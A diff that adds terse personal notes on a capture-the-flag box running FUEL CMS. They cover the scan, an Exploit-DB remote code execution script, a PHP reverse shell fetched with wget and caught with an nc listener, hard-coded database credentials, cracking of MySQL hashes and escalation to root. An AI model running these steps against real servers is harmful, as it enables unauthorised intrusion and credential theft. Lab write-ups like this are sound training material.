@@ -1,0 +1,88 @@
+Wgel - Ignite - 17 Oct 2022
+
+10.10.55.122
+------------------------------------
+
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to FUEL CMS
+MAC Address: 02:CB:4E:00:A3:4F (Unknown)
+
+
+**searchsploit FUEL
+fuelCMS 1.4.1 - Remote Code Execution         | linux/webapps/47138.py
+---> this one doesn't work
+
+used exploit db, there are other exploits **
+
+https://www.exploit-db.com/exploits/50477
+
+python3 fuel.py -u http://$IP
+
+Enter Command $cat /home/www-data/flag.txt
+system6470e394cbf6dab6a91682cc8585059b 
+
+
+6470e394cbf6dab6a91682cc8585059b
+
+
+create revshell.php with penstest monkey
+wget the file to the web root
+access the $IP/revshell.php with nc listener open
+
+**shell
+
+priv escc
+
+know that 3306 is open for databases
+searchign for database creds 
+
+www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php 
+
+$db['default'] = array(
+	'dsn'	=> '',
+	'hostname' => 'localhost',
+	'username' => 'root',
+	'password' => 'mememe',
+	'database' => 'fuel_schema',
+	'dbdriver' => 'mysqli',
+	'dbprefix' => '',
+	'pconnect' => FALSE,
+	'db_debug' => (ENVIRONMENT !== 'production'),
+	'cache_on' => FALSE,
+	'cachedir' => '',
+	'char_set' => 'utf8',
+	'dbcollat' => 'utf8_general_ci',
+	'swap_pre' => '',
+	'encrypt' => FALSE,
+	'compress' => FALSE,
+	'stricton' => FALSE,
+	'failover' => array(),
+	'save_queries' => TRUE
+
+**log into mysql database with above creds
+
+
+| user             | authentication_string                     |
++------------------+-------------------------------------------+
+| root             | *438F5F7ACE41FE31D5EB2797754CA0DA3CCF04F9 |
+| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+| debian-sys-maint | *5479FCA988211C9B51307CCE1CE1711DF6592181 |
+
+
+crackstation.net for root string
+cracked --> mememe
+
+su root
+password: mememe
+
+root@ubuntu:~# cat root.txt 
+b9bbcb33e11b80be759c4e844862482d 
+
